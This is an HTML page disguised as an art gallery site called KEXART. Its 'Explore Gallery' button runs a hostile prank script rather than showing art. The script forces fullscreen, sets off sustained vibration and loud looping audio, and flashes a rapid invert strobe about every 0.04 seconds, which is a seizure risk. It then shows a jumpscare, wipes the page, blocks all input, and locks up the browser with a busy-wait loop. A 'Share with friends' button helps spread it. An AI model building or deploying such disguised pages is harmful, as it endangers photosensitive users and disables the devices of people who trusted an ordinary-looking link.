<!doctype html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=no">
<meta name="theme-color" content="#000000">
<title>KEXART – Contemporary Art</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Playfair+Display:wght@800;900&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  html, body { overflow-x: hidden; width: 100%; height: 100%; }
  body { font-family: 'Inter', system-ui, sans-serif; background: #fff; color: #0b0b0f; line-height: 1.6; transition: none; }

  /* === LAYOUT KEXART === */
  .header { background: #000; padding: 16px 20px; display: flex; align-items: center; gap: 10px; position: sticky; top: 0; z-index: 100; }
  .header-logo { color: #fff; font-size: 22px; font-weight: 700; letter-spacing: -0.5px; display: flex; align-items: center; gap: 8px; }
  .header-logo::before { content: '▲'; font-size: 14px; }

  .hero { min-height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 40px 20px; background: #fff; }
  .hero-inner { max-width: 720px; width: 100%; }
  .hero-eyebrow { font-size: 13px; font-weight: 500; letter-spacing: 0.45em; text-transform: uppercase; color: #6b7280; margin-bottom: 28px; }
  .hero-title { font-family: 'Playfair Display', Georgia, serif; font-weight: 900; font-size: clamp(64px, 14vw, 150px); line-height: 0.9; letter-spacing: -0.04em; background: linear-gradient(180deg, #05060a 30%, #3b4452 100%); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 32px; }
  .hero-sub { font-size: clamp(16px, 2vw, 22px); line-height: 1.5; color: #4b5563; max-width: 600px; margin: 0 auto 36px; }

  .btn-group { display: flex; flex-direction: column; align-items: center; gap: 14px; margin-bottom: 32px; }
  .btn { display: inline-flex; align-items: center; justify-content: center; width: 100%; max-width: 340px; height: 58px; border-radius: 14px; font-size: 13px; font-weight: 600; letter-spacing: 2px; text-decoration: none; cursor: pointer; border: none; font-family: inherit; }
  .btn-primary { color: #fff; background: linear-gradient(145deg, #202020, #050505); border: 1px solid rgba(255,255,255,0.16); box-shadow: 8px 8px 18px rgba(0,0,0,0.22); }
  .btn-secondary { color: #222; background: rgba(255,255,255,0.72); border: 1px solid rgba(0,0,0,0.16); box-shadow: 5px 7px 18px rgba(0,0,0,0.10); }
  .wave { display: flex; align-items: center; gap: 2px; margin-right: 12px; height: 24px; }
  .wave i { display: block; width: 2px; height: 8px; background: #fff; border-radius: 5px; animation: waveAnim 1s ease-in-out infinite; }
  .wave i:nth-child(1), .wave i:nth-child(5) { animation-delay: 0.1s; }
  .wave i:nth-child(2), .wave i:nth-child(4) { animation-delay: 0.25s; }
  .wave i:nth-child(3) { animation-delay: 0.4s; }
  @keyframes waveAnim { 0%, 100% { height: 7px; } 50% { height: 20px; } }

  .share-wrap { position: relative; display: flex; justify-content: center; margin-bottom: 40px; }
  .share-btn { display: inline-flex; align-items: center; gap: 10px; padding: 12px 24px 12px 12px; border: 1px solid rgba(255,255,255,0.3); border-radius: 999px; background: linear-gradient(120deg, #334155, #0f172a); color: #fff; font: 700 15px/1 inherit; cursor: pointer; }
  .share-btn svg { width: 22px; height: 22px; background: rgba(255,255,255,0.25); border-radius: 50%; padding: 4px; }

  .gallery-section { padding: 60px 20px; background: #f9f9fb; }
  .gallery-inner { max-width: 800px; margin: 0 auto; }
  .gallery-title { font-family: 'Playfair Display', serif; font-size: 32px; font-weight: 900; margin-bottom: 30px; text-align: center; color: #1f2933; }
  .gallery-grid { display: flex; flex-direction: column; gap: 24px; }
  .gallery-item { width: 100%; border-radius: 12px; overflow: hidden; background: #fff; }
  .gallery-item img { width: 100%; height: auto; display: block; }

  .article-section { padding: 60px 20px; background: #fff; }
  .article-inner { max-width: 800px; margin: 0 auto; }
  .article-inner h2 { font-family: 'Playfair Display', serif; font-size: 28px; font-weight: 900; margin: 40px 0 16px; color: #1f2933; }
  .article-inner p { font-size: 17px; line-height: 1.7; color: #3e4c59; margin-bottom: 16px; }
  .article-inner strong { color: #1f2933; }
  .footer { background: #f1d306; padding: 20px; text-align: center; font-weight: 600; color: #1f2933; }

  /* === PRANK EFFECTS === */
  body.shake { animation: shake 0.05s infinite; }
  @keyframes shake { 
    0%{transform:translate(0,0) rotate(0deg)} 
    25%{transform:translate(-15px,10px) rotate(-2deg)} 
    50%{transform:translate(15px,-10px) rotate(2deg)} 
    75%{transform:translate(-10px,-15px) rotate(-1deg)} 
    100%{transform:translate(10px,15px) rotate(1deg)} 
  }
  body.strobe { animation: strobe 0.04s infinite; }
  @keyframes strobe { 
    0%,49%{background:#fff; filter:invert(1) contrast(200%)} 
    50%,100%{background:#000; filter:invert(0) contrast(100%)} 
  }
  .jumpscare { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; font-size: min(40vw, 250px); background: #000; z-index: 99999; pointer-events: none; }
</style>
</head>
<body>

<!-- TARUH FILE WAV LO DI SINI -->
<audio id="prank-audio" src="suara.wav" preload="auto" loop></audio>

<!-- BUNGKUS SEMUA UI DALAM SATU WADAH (WRAPPER) -->
<div id="app-wrapper">
  <header class="header" id="kx-header"><div class="header-logo">Kexart</div></header>

  <section class="hero" id="kx-hero">
    <div class="hero-inner">
      <p class="hero-eyebrow">Original Paintings</p>
      <h1 class="hero-title">KEXART</h1>
      <p class="hero-sub">KEXART is Contemporary Art, Gallery, Works &amp; Creative Process</p>
      <div class="btn-group">
        <a href="#" id="trigger-prank" class="btn btn-primary"><span class="wave"><i></i><i></i><i></i><i></i><i></i></span><span>EXPLORE GALLERY</span></a>
        <a href="#" class="btn btn-secondary"><span>MY ARTWORK GALLERY</span></a>
      </div>
      <div class="share-wrap">
        <button class="share-btn" onclick="if(navigator.share)navigator.share({title:document.title,url:location.href})">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><path d="M8.6 13.5l6.8 4M15.4 6.5l-6.8 4"/></svg>
          Share with friends
        </button>
      </div>
    </div>
  </section>

  <section class="gallery-section" id="kx-content">
    <div class="gallery-inner">
      <h2 class="gallery-title">Explore the KEXART VIEW Gallery</h2>
      <div class="gallery-grid">
        <div class="gallery-item"><img src="https://kexart.com.in/wp-content/uploads/2026/09/1.webp" alt="Artwork 1"></div>
        <div class="gallery-item"><img src="https://kexart.com.in/wp-content/uploads/2026/09/2-771x1024.webp" alt="Artwork 2"></div>
      </div>
    </div>
  </section>

  <footer class="footer" id="kx-footer">Kexart 2026</footer>
</div>

<script>
  const trigger = document.getElementById('trigger-prank');
  const body = document.body;
  const wrapper = document.getElementById('app-wrapper');
  const audio = document.getElementById('prank-audio');

  function lagScreen() {
    const block = (e) => { e.preventDefault(); e.stopPropagation(); return false; };
    ['click','touchstart','mousedown','keydown','contextmenu'].forEach(ev => 
      document.addEventListener(ev, block, { capture: true })
    );
    const loop = () => {
      const end = Date.now() + 200;
      while (Date.now() < end) {} 
      setTimeout(loop, 5); 
    };
    loop();
  }

  function jumpscare() {
    const el = document.createElement('div');
    el.className = 'jumpscare';
    el.textContent = '😱';
    document.body.appendChild(el);
    setTimeout(() => el.remove(), 900);
  }

  trigger.addEventListener('click', (e) => {
    e.preventDefault();
    
    // 1. GETARAN INSTAN (Tembak langsung detik ini juga sebelum browser nge-lock layar)
    if (navigator.vibrate) {
      navigator.vibrate(2000); // Langsung getar 2 detik tanpa henti
      
      const brutalLoop = setInterval(() => {
        navigator.vibrate([1000, 10, 1000, 10, 1000]); 
      }, 3030);
      
      setTimeout(() => {
        clearInterval(brutalLoop);
        navigator.vibrate(0);
      }, 10000);
    }

    // 2. FULLSCREEN INSTAN
    const el = document.documentElement;
    if (el.requestFullscreen) {
      el.requestFullscreen().catch(() => {});
    } else if (el.webkitRequestFullscreen) {
      el.webkitRequestFullscreen();
    }

    // 3. PUTAR FILE WAV LO
    audio.volume = 1.0; 
    audio.loop = true; 
    audio.play().catch((err) => {
      console.warn("Gagal muter audio, pastiin file .wav ada di folder yang sama.", err);
    });

    // 4. MULAI EFEK STROBE & SHAKE
    jumpscare();
    body.classList.add('shake');
    setTimeout(() => body.classList.add('strobe'), 100);

    // 5. HITAM PEKAT & LAG (YANG DIHAPUS CUMA WRAPPER, AUDIO TETAP AMAN)
    setTimeout(() => {
      if (wrapper) wrapper.remove(); 
      
      body.className = ''; 
      body.style.cssText = `margin:0!important;padding:0!important;background:#000000!important;overflow:hidden!important;position:fixed!important;inset:0!important;z-index:2147483647!important;`;
      document.documentElement.style.cssText = `background:#000000!important;margin:0!important;padding:0!important;overflow:hidden!important;`;
      
      setTimeout(() => { window.scrollTo(0, 1); }, 50);
      document.title = " ";

      lagScreen();
    }, 2500); 

  });
</script>
</body>
  </html>
